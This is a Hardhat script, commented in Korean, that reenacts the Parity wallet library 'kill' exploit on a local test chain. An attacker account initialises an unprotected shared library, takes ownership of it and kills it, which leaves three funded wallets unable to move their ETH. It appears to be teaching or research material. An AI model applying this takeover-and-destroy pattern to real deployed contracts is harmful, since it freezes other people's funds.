import { network } from "hardhat";

const { ethers } = await network.connect();

async function main() {
  const [deployer, attacker] = await ethers.getSigners();

  console.log("Deployer:", deployer.address);
  console.log("Attacker:", attacker.address);

  // 1. 취약한 라이브러리 배포
  const Library = await ethers.getContractFactory("WalletLibraryKillSimulated", deployer);
  const library = await Library.deploy();
  await library.waitForDeployment();

  const libraryAddress = await library.getAddress();
  console.log("WalletLibraryKillSimulated deployed to:", libraryAddress);

  // 2. 지갑 3개 배포
  const Wallet = await ethers.getContractFactory("ParityWalletUsingSimulatedLibrary", deployer);

  const wallet1 = await Wallet.deploy(libraryAddress, deployer.address);
  await wallet1.waitForDeployment();

  const wallet2 = await Wallet.deploy(libraryAddress, deployer.address);
  await wallet2.waitForDeployment();

  const wallet3 = await Wallet.deploy(libraryAddress, deployer.address);
  await wallet3.waitForDeployment();

  const wallet1Address = await wallet1.getAddress();
  const wallet2Address = await wallet2.getAddress();
  const wallet3Address = await wallet3.getAddress();

  console.log("Wallet1:", wallet1Address);
  console.log("Wallet2:", wallet2Address);
  console.log("Wallet3:", wallet3Address);

  // 3. 각 지갑에 5 ETH 입금
  await deployer.sendTransaction({
    to: wallet1Address,
    value: ethers.parseEther("5"),
  });

  await deployer.sendTransaction({
    to: wallet2Address,
    value: ethers.parseEther("5"),
  });

  await deployer.sendTransaction({
    to: wallet3Address,
    value: ethers.parseEther("5"),
  });

  console.log("Before library kill:");
  console.log("Wallet1 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet1Address)), "ETH");
  console.log("Wallet2 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet2Address)), "ETH");
  console.log("Wallet3 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet3Address)), "ETH");

  // 4. 공격자가 라이브러리 자체를 초기화해서 owner 탈취
  await library.connect(attacker).initWallet(attacker.address);
  console.log("Library owner hijacked:", await library.owner());

  // 5. 공격자가 라이브러리 kill
  await library.connect(attacker).kill();
  console.log("Library kill() called by attacker");
  console.log("Library killed state:", await library.killed());

  // 6. 지갑에서 execute 호출 시도
  const wallet1AsLibrary = Library.attach(wallet1Address);

  try {
    await wallet1AsLibrary
      .connect(deployer)
      .execute(deployer.address, ethers.parseEther("1"));

    console.log("Wallet1 execute succeeded");
  } catch (error) {
    console.log("Wallet1 execute failed: funds are frozen");
  }

  console.log("After attack:");
  console.log("Wallet1 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet1Address)), "ETH");
  console.log("Wallet2 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet2Address)), "ETH");
  console.log("Wallet3 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet3Address)), "ETH");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
